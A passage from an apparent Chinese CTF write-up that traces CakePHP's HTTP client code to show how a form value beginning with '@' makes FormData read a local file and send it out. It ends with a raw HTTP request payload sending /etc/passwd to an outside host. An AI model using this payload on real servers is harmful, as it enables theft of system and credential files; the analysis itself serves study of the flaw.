+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Do a POST request.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url The url or path you want to request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed $data The post data you want to send.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options Additional options for the request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($url, $data = [], array $options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$options = <span class="keyword">$this</span>-&gt;_mergeOptions($options);</span><br><span class="line">	$url = <span class="keyword">$this</span>-&gt;buildUrl($url, [], $options);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_doRequest(Request::METHOD_POST, $url, $data, $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这两个函数最后进行请求的时候都调用了<code>$this-&gt;_doRequest(Request::METHOD_POST|Request::METHOD_GET, $url, $data, $options);</code>，继续跟进</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Helper method for doing non-GET requests.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $method HTTP method.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url URL to request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed $data The request body.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options The options to use. Contains auth, proxy, etc.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_doRequest</span><span class="params">($method, $url, $data, $options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$request = <span class="keyword">$this</span>-&gt;_createRequest(</span><br><span class="line">		$method,</span><br><span class="line">		$url,</span><br><span class="line">		$data,</span><br><span class="line">		$options</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;send($request, $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>又调用了<code>$this-&gt;_createRequest($method,$url,$data,$options);</code>继续跟<code>_createRequest</code>看它对输入的url和data都做了什么</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Creates a new request object based on the parameters.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $method HTTP method name.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url The url including query string.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed $data The request body.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options The options to use. Contains auth, proxy, etc.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Request</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_createRequest</span><span class="params">($method, $url, $data, $options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$headers = <span class="keyword">isset</span>($options[<span class="string">'headers'</span>]) ? (<span class="keyword">array</span>)$options[<span class="string">'headers'</span>] : [];</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'type'</span>])) &#123;</span><br><span class="line">		$headers = array_merge($headers, <span class="keyword">$this</span>-&gt;_typeHeaders($options[<span class="string">'type'</span>]));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (is_string($data) &amp;&amp; !<span class="keyword">isset</span>($headers[<span class="string">'Content-Type'</span>]) &amp;&amp; !<span class="keyword">isset</span>($headers[<span class="string">'content-type'</span>])) &#123;</span><br><span class="line">		$headers[<span class="string">'Content-Type'</span>] = <span class="string">'application/x-www-form-urlencoded'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$request = <span class="keyword">new</span> Request($url, $method, $headers, $data);</span><br><span class="line">	$cookies = <span class="keyword">isset</span>($options[<span class="string">'cookies'</span>]) ? $options[<span class="string">'cookies'</span>] : [];</span><br><span class="line">	<span class="comment">/** <span class="doctag">@var</span> \Cake\Http\Client\Request $request */</span></span><br><span class="line">	$request = <span class="keyword">$this</span>-&gt;_cookies-&gt;addToRequest($request, $cookies);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'auth'</span>])) &#123;</span><br><span class="line">		$request = <span class="keyword">$this</span>-&gt;_addAuthentication($request, $options);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'proxy'</span>])) &#123;</span><br><span class="line">		$request = <span class="keyword">$this</span>-&gt;_addProxy($request, $options);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $request;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第20行在请求的时候创建了一个Request对象进行请求<code>new Request($url, $method, $headers, $data);</code><br>Request类位于<code>\Cake\Http\Client\Request</code>，在<code>\vendor\cakephp\cakephp\src\Http\Client\Request.php</code>中，继续跟进</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span> <span class="keyword">extends</span> <span class="title">Message</span> <span class="keyword">implements</span> <span class="title">RequestInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">RequestTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Provides backwards compatible defaults for some properties.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $url The request URL</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $method The HTTP method to use.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $headers The HTTP headers to set.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array|string|null $data The request body to use.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url = <span class="string">''</span>, $method = self::METHOD_GET, array $headers = [], $data = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;validateMethod($method);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uri = <span class="keyword">$this</span>-&gt;createUri($url);</span><br><span class="line">        $headers += [</span><br><span class="line">            <span class="string">'Connection'</span> =&gt; <span class="string">'close'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span> =&gt; <span class="string">'CakePHP'</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;addHeaders($headers);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;body($data);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get/set the body/payload for the message.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Array data will be serialized with Cake\Http\FormData,</span></span><br><span class="line"><span class="comment">     * and the content-type will be set.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string|array|null $body The body for the request. Leave null for get</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed Either $this or the body value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">body</span><span class="params">($body = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($body === <span class="keyword">null</span>) &#123;</span><br><span class="line">            $body = <span class="keyword">$this</span>-&gt;getBody();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $body ? $body-&gt;__toString() : <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array($body)) &#123;</span><br><span class="line">            $formData = <span class="keyword">new</span> FormData();</span><br><span class="line">            $formData-&gt;addMany($body);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;header(<span class="string">'Content-Type'</span>, $formData-&gt;contentType());</span><br><span class="line">            $body = (string)$formData;</span><br><span class="line">        &#125;</span><br><span class="line">        $stream = <span class="keyword">new</span> Stream(<span class="string">'php://memory'</span>, <span class="string">'rw'</span>);</span><br><span class="line">        $stream-&gt;write($body);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;stream = $stream;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在第25行的构造函数中使用<code>$this-&gt;body($data)</code>将data放在了body中，而在body函数中有一行代码判断data是否为数组，body函数的文档中还提到了<code>Array data will be serialized with Cake\Http\FormData</code>,也就是说如果是数组的话会new一个FormData对象，并且将data添加到FormData中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (is_array($body)) &#123;</span><br><span class="line">	 $formData = <span class="keyword">new</span> FormData();</span><br><span class="line">	 $formData-&gt;addMany($body);</span><br><span class="line">	 <span class="keyword">$this</span>-&gt;header(<span class="string">'Content-Type'</span>, $formData-&gt;contentType());</span><br><span class="line">	 $body = (string)$formData;</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>跟到FormData中，位于Cake\Http\FormData</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FormData</span> <span class="keyword">implements</span> <span class="title">Countable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add a new part to the data.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The value for a part can be a string, array, int,</span></span><br><span class="line"><span class="comment">     * float, filehandle, or object implementing __toString()</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If the $value is an array, multiple parts will be added.</span></span><br><span class="line"><span class="comment">     * Files will be read from their current position and saved in memory.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string|\Cake\Http\Client\FormData $name The name of the part to add,</span></span><br><span class="line"><span class="comment">     *   or the part data object.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $value The value for the part.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> $this</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($name, $value = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addRecursive($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_resource($value)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[<span class="number">0</span>] === <span class="string">'@'</span>) &#123;</span><br><span class="line">            trigger_error(</span><br><span class="line">                <span class="string">'Using the @ syntax for file uploads is not safe and is deprecated. '</span> .</span><br><span class="line">                <span class="string">'Instead you should use file handles.'</span>,</span><br><span class="line">                E_USER_DEPRECATED</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($name <span class="keyword">instanceof</span> FormDataPart &amp;&amp; $value === <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_hasComplexPart = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_parts[] = $name;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_parts[] = <span class="keyword">$this</span>-&gt;newPart($name, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add multiple parts at once.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Iterates the parameter and adds all the key/values.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data Array of data to add.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> $this</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addMany</span><span class="params">(array $data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;add($name, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add either a file reference (string starting with @)</span></span><br><span class="line"><span class="comment">     * or a file handle.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $name The name to use.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $value Either a string filename, or a filehandle.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Cake\Http\Client\FormDataPart</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFile</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_hasFile = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        $filename = <span class="keyword">false</span>;</span><br><span class="line">        $contentType = <span class="string">'application/octet-stream'</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_resource($value)) &#123;</span><br><span class="line">            $content = stream_get_contents($value);</span><br><span class="line">            <span class="keyword">if</span> (stream_is_local($value)) &#123;</span><br><span class="line">                $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">                $metadata = stream_get_meta_data($value);</span><br><span class="line">                $contentType = $finfo-&gt;file($metadata[<span class="string">'uri'</span>]);</span><br><span class="line">                $filename = basename($metadata[<span class="string">'uri'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">            $value = substr($value, <span class="number">1</span>);</span><br><span class="line">            $filename = basename($value);</span><br><span class="line">            $content = file_get_contents($value);</span><br><span class="line">            $contentType = $finfo-&gt;file($value);</span><br><span class="line">        &#125;</span><br><span class="line">        $part = <span class="keyword">$this</span>-&gt;newPart($name, $content);</span><br><span class="line">        $part-&gt;type($contentType);</span><br><span class="line">        <span class="keyword">if</span> ($filename) &#123;</span><br><span class="line">            $part-&gt;filename($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;add($part);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $part;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>addMany($body)</code>函数中将data数组进行了处理，将data数组里的每一个键和值都用<code>$this-&gt;add($name, $value)</code>加入到body中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;add($name, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再看add函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($name, $value = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;addRecursive($name, $value);</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (is_resource($value)) &#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[<span class="number">0</span>] === <span class="string">'@'</span>) &#123;</span><br><span class="line">		trigger_error(</span><br><span class="line">			<span class="string">'Using the @ syntax for file uploads is not safe and is deprecated. '</span> .</span><br><span class="line">			<span class="string">'Instead you should use file handles.'</span>,</span><br><span class="line">			E_USER_DEPRECATED</span><br><span class="line">		);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">	&#125; <span class="keyword">elseif</span> ($name <span class="keyword">instanceof</span> FormDataPart &amp;&amp; $value === <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_hasComplexPart = <span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_parts[] = $name;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_parts[] = <span class="keyword">$this</span>-&gt;newPart($name, $value);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在add函数中第7行代码出了问题<br><code>elseif (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[0] === &#39;@&#39;)</code><br>如果value是”@”开头的字符串的话会转入<code>addFile</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFile</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">		<span class="keyword">if</span> (is_resource($value)) &#123;</span><br><span class="line">			...</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">			$value = substr($value, <span class="number">1</span>);</span><br><span class="line">			$filename = basename($value);</span><br><span class="line">			$content = file_get_contents($value);</span><br><span class="line">			$contentType = $finfo-&gt;file($value);</span><br><span class="line">		&#125;</span><br><span class="line">	$part = <span class="keyword">$this</span>-&gt;newPart($name, $content);</span><br><span class="line">	$part-&gt;type($contentType);</span><br><span class="line">	<span class="keyword">if</span> ($filename) &#123;</span><br><span class="line">		$part-&gt;filename($filename);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;add($part);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $part;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于此时进来的<code>$value</code>是一个字符串，所以流程会转入else中，而在else里第10行代码可以直接读取文件<br><code>$content = file_get_contents($value);</code><br>读取到的内容在<code>$content</code>变量中，而<code>$content</code>会存入<code>FormDataPart</code>里</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newPart</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> FormDataPart($name, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后再次将part加入<code>add($part)</code>，所以读取到的content会存在body中,这样就构成了一个本地文件读取漏洞，<br>Paylaod:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?url&#x3D;http:&#x2F;&#x2F;\*\*\*.\*\*\*.\*\*\*.\*\*\*&#x2F;&amp;data[a]&#x3D;@&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1</span><br><span class="line">Host: 13.230.134.135</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.67 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Referer: http:&#x2F;&#x2F;13.230.134.135&#x2F;</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: BD_UPN&#x3D;12314753</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+<p>会在服务器收到读取到的文件内容</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/" rel="prev" title="BlueWhale2018年纳新题目Writeup">
+      <i class="fa fa-chevron-left"></i> BlueWhale2018年纳新题目Writeup
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/10/28/Seccon2018-GhostKingdom-Writeup/" rel="next" title="Seccon2018 GhostKingdom Writeup">
